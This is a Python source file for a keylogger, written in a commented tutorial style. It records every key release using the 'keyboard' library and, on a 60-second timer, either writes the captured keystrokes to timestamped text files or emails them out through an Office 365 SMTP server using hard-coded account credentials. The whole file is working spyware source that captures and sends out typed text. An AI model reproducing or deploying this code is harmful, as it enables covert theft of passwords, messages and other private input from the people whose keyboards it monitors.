import keyboard # for keylogs
import smtplib # for sending emails using SMTP protocol(gmai
from threading import Timer # to make a method run after an interval amount of time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

"""
if you choose to report keys logs via email, you should setup an email account on outloook or 
any other provider except gmail

make sure third party apps are allowed to login via email and password"""

SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass the SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # self.log string, contains the logs of all key strokes within 'self.interval'

        self.log = ""
        # record start & end times
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    """
    Making a callback function
    1. we need to utilize the keyboard on_release() function which takes a callback, 
    which will be called for every KEY_UP event(whenever you release key on the keyboard)

    this callback takes on parameter whick is the keyboard event


    """

    def callback(self, event):
        """this callback is invoked whenever a keyboard event has occured"""

        name = event.name
        if len(name) > 1:
            # not a character, special key(e.g ctrl, alt)
            # uppercase with []

            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever enter is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscore
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"


        # finaly, add the key name to our global variable self.log
        self.log += name       


    # if you choose to rreport logs via txt file

    def update_filename(self):
        # construct the filename to be identified by start && end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")

        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
            """This method creates a log file in the current directory that contains. the
            current keylogs in the self.log variable
            """

            # open the file in write mode
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)

            print(f"[+] Saved {self.filename}.txt")



    # Reporting via Email

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart form a tet
        it creates an HTML version as well as tet version to be sent as an enmail"""

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"


        # simple paragraph
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        # after making the email, convert back as string message
        return msg.as_string()
    

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in this case, it's for Microsoft365, Outlook, Hotmail, and live.com
        
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS  mode for security
        server.starttls()
        # login to the emaail account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminate the session
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing {message}")



    # a method to report key logs after every period

    def report(self):

        """This function gets called every self.interval 
        it basically sends key logs and resets self.log variable"""

        if self.log:
            # if there is something in the log report
            self.end_dt = datetime.now()
            # update self.filename
            self.update_filename()

            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

                print(f"[{self.filename}] - {self.log}")
            
            self.start_dt = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        # set the thread as daemon( dies when the main thread die)
        timer.daemon = True
        # start the timer
        timer.start()


    # the metod to call on_release method
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the jeylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()



if __name__ == "__main__":
     # if you want keylogger to send to your email
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    # if you want a keylogger to record keylogs in local file

    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
    keylogger.start()
        


    


    


